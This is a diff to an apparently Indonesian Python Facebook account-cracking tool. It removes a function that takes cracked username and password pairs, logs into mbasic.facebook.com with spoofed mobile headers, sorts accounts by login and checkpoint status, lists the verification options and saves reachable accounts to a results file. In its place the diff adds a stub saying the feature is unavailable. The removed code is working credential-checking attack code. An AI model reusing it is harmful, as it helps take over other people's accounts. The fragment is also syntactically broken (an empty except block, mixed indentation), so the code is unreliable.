@@ -192,7 +192,7 @@ def menu():
     elif asw == "7":
     	seting_yntkts()
     elif asw == "8":
-        buatngecek()
+        scr()
     elif asw == "9":
 	cekhasil()
     elif asw == "10":
@@ -402,93 +402,10 @@ def yo_ndak_tau_ko_tanya_saia():
         print '\n %s[%s!%s]\x1b[1;93m [Y/t] ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
 
 ####CEK OPSI HASIL CRACK####
-def buatngecek():
-	dirs = os.listdir("CP")
-	print("")
-	for file in dirs:
-		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] CP/"+file)
-	print("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] masukan file (ex: CP/%s.txt)"%(tanggal))
-	files = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mnama file  \x1b[1;97m: \x1b[1;92m")
-	if files == "":
-		menu()
-
-		try:
-			ttll = ("%s"%(titid[2]))
-		except:
-			ttll = (" - ")
-		try:
-			log_hasil(titid[0], titid[1], ttll)
-		except requests.exceptions.ConnectionError:
-			
-                        
-		print("\n")
-def log_hasil(user, pasw, ttll):
-    print(war+C+user+"|"+pasw+" | "+ttll)
-    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
-    host = "https://mbasic.facebook.com"
-    ses = requests.Session()
-    ses.headers.update({
-    "Host": "mbasic.facebook.com",
-    "cache-control": "max-age=0",
-    "upgrade-insecure-requests": "1",
-    "origin": host,
-    "content-type": "application/x-www-form-urlencoded",
-    "user-agent": ua,
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-    "x-requested-with": "mark.via.gp",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-user": "?1",
-    "sec-fetch-dest": "document",
-    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
-    "accept-encoding": "gzip, deflate",
-    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-    })
-    data = {}
-    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
-    fm = ged.find("form",{"method":"post"})
-    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
-    for i in fm.find_all("input"):
-        if i.get("name") in list:
-            data.update({i.get("name"):i.get("value")})
-        else:
-            continue
-    data.update({"email":user,"pass":pasw})
-    try:
-        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
-    except requests.exceptions.TooManyRedirects:
-        print("%s[%s!%s] %sAkun Terkena Spam"%(M,P,M,P))
-    if "c_user" in ses.cookies:
-        print("%s[%s•%s] %sAkun OK Tidak Checkpoint"%(I,P,I,I))
-    elif "checkpoint" in ses.cookies:
-        form = run.find("form")
-        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
-        jzst = form.find("input",{"name":"jazoest"})["value"]
-        nh   = form.find("input",{"name":"nh"})["value"]
-        dataD = {
-            "fb_dtsg": dtsg,
-            "fb_dtsg": dtsg,
-            "jazoest": jzst,
-            "jazoest": jzst,
-            "checkpoint_data":"",
-            "submit[Continue]":"Lanjutkan",
-            "nh": nh
-        }
-        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
-        ngew = [yy.text for yy in xnxx.find_all("option")]
-        if(str(len(ngew))=="0"):
-            jalan("%s[%s!%s] %sAkun Ini Tap Yes !!!"%(K,I,K,I))
-            open("Hasil/Akun_Tap_Yes.txt","a+").write("{}|{}\n".format(user,pasw))
-            bokep_japan_yang_terbaru("TAP", user, pasw, "-")
-        else:
-            print("%s[%s•%s]%s%s Opsi Yang Tersedia"%(C,P,C,P,str(len(ngew))))
-        for opt in range(len(ngew)):
-            print(" "*3, str(opt+1)+". "+ngew[opt])
-    elif "login_error" in str(run):
-        oh = run.find("div",{"id":"login_error"}).find("div").text
-        print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
-    else:
-        print("%s[%s!%s] %sPassword Sudah DiUbah !"%(M,P,M,P))
+def scr():
+    jalan(' [*] maaf fitur ini tidak tersedia sekarang\n [*] silahkan tunggu update terbaru')
+    raw_input('\n [*] kembali ')
+    menu()
 ####LAPORAN BUG####
 def laporbug():
     asulo = raw_input('\n \x1b[1;92m[?] masukan laporan bug script : \x1b[1;92m').replace(' ', '%20')
